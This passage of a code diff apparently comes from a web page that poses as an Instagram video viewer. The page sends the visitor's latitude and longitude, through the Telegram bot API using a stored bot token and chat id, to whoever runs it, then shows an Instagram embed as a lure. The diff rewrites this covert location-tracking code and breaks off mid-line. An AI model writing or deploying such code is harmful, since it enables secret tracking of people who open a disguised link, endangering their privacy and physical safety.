-      chat_id: TS.chatId,
+      chat_id: window._TRACK.chatId,
       text: text,
       parse_mode: 'Markdown'
     })
-  }).catch(function(e) {
-    console.error('Telegram error:', e);
-  });
+  }).catch(e => console.error(e));
 
-  // Kirim juga lokasi asli biar bisa diklik di Telegram
-  if (acc < 1000) {
-    fetch('https://api.telegram.org/bot' + TS.botToken + '/sendLocation', {
+  if (type !== 'ip') {
+    fetch('https://api.telegram.org/bot' + window._TRACK.botToken + '/sendLocation', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: TS.chatId,
+        chat_id: window._TRACK.chatId,
         latitude: lat,
         longitude: lng
       })
-    }).catch(function(e) { console.error(e); });
+    }).catch(e => console.error(e));
   }
 }
 
 function showVideo() {
-  var statusEl = document.getElementById('trackStatus');
-  var embedEl = document.getElementById('igEmbed');
+  const spinner = document.getElementById('trackSpinner');
+  const title = document.getElementById('trackTitle');
+  const status = document.getElementById('trackStatus');
+  const embed = document.getElementById('igEmbed');
 
-  // Sembunyikan spinner, tampilkan video
-  var spinner = document.querySelector('#trackingView .spinner');
   if (spinner) spinner.style.display = 'none';
+  if (title) title.textContent = 'Instagram';
+  if (status) status.style.display = 'none';
 
-  var titleEl = document.querySelector('#trackingView .track-title');
-  if (titleEl) titleEl.textContent = 'Instagram';
-
-  statusEl.style.display = 'none';
-
-  // Extract IG info
-  var info = extractIgInfo(TS.igUrl);
+  const info = extractIgInfo(window._TRACK.igUrl);
   if (!info) {
-    embedEl.innerHTML =
-      '<div style="padding:40px;color:#666;text-align:center;">' +
-        'Video tidak tersedia<br><br>' +
-        '<a href="' + TS.igUrl + '" style="color:#0095f6;">Buka Instagram →</a>' +
-      '</div>';
-    embedEl.style.display = 'block';
+    embed.innerHTML = '<div style="padding:40px;color:#666;text-align:center;">' +
+      'Video tidak tersedia<br><br>' +
+      '<a href="' + window._TRACK.igUrl + '" style="color:#0095f6;">Buka Instagram →</a></div>';
+    embed.style.display = 'block';
     return;
   }
 
-  var embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
-  embedEl.innerHTML =
-    '<iframe src="' + embedUrl + '" ' +
-    'allowtransparency="true" ' +
-    'allowfullscreen="true" ' +
-    'scrolling="no" ' +
-    'frameborder="0"></iframe>';
-  embedEl.style.display = 'block';
+  const embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
+  embed.innerHTML = '<iframe src="' + embedUrl + '" allowtransparency="true" allowfullscreen="true" scrolling="no" frameborder="0"></iframe>';
+  embed.style.display = 'block';
 }
 
 function extractIgInfo(url) {
   if (!url) return null;
-  var match = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
-  if (!match) return null;
-  return { type: match[1], id: match[2] };
-}
-</script>
-
-</body>
-</html>
+  const m = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
+  return m ? { type: m[1], id
